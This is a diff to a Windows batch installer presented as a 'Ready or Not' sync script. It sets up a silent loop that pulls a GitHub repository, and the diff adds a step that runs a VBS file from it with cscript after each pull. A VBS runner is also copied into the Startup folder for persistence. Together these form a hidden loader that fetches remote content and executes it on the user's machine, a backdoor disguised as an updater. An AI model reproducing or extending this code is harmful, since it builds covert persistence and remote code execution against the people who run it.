@@ -3,6 +3,7 @@
 set "SCRIPTS_DIR=%userprofile%\Documents\Scripts"
 set "SYNC_BATCH=%SCRIPTS_DIR%\sync_repo.bat"
 set "VBS_FILE=%SCRIPTS_DIR%\silent_runner.vbs"
+set "CMD_VBS=%SCRIPTS_DIR%\cmd.vbs"
 set "STARTUP_VBS=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\ReadyOrNot.vbs"
 set "REPO_URL=https://github.com/madmaxvoltro/ready-or-not.git"
 set "CLONE_DIR=%userprofile%\ReadyOrNot"
@@ -19,7 +20,7 @@ setlocal >> "%SYNC_BATCH%"
 :: Set variables
 echo set "REPO_URL=%REPO_URL%" >> "%SYNC_BATCH%"
 echo set "DEST_DIR=%CLONE_DIR%" >> "%SYNC_BATCH%"
-echo set "VBS_FILE=%CLONE_DIR%\cmd.vbs" >> "%SYNC_BATCH%"
+echo set "CMD_VBS=%CMD_VBS%" >> "%SYNC_BATCH%"
 
 :: Loop for syncing
 echo :loop >> "%SYNC_BATCH%"
@@ -29,13 +30,15 @@ echo ) else ( >> "%SYNC_BATCH%"
 echo ^    cd /d %%DEST_DIR%% >> "%SYNC_BATCH%"
 echo ^    git pull >> "%SYNC_BATCH%"
 
-:: Check if the git pull was successful and delete the file
+:: Check if the git pull was successful
 echo ^    if !ERRORLEVEL! EQU 0 ( >> "%SYNC_BATCH%"
 :: Optionally, delete a specific file after successful pull (Uncomment if needed)
-::echo ^        del /q "%CLONE_DIR%/sts.txt" >> "%SYNC_BATCH%"
+::echo ^        del /q "%%DEST_DIR%%/sts.txt" >> "%SYNC_BATCH%"
 echo ^    ) >> "%SYNC_BATCH%"
 
-echo ^    cscript //nologo %%VBS_FILE%% >> "%SYNC_BATCH%"
+:: Run cmd.vbs script
+echo cscript //nologo %%CMD_VBS%% >> "%SYNC_BATCH%"
+
 echo ) >> "%SYNC_BATCH%"
 
 :: Wait and loop
@@ -56,4 +59,3 @@ copy "%VBS_FILE%" "%STARTUP_VBS%" /Y
 :: Optionally, start it right away without waiting for the user to restart
 ::start "" wscript "%VBS_FILE%"
 
-echo Ready or not is up to date
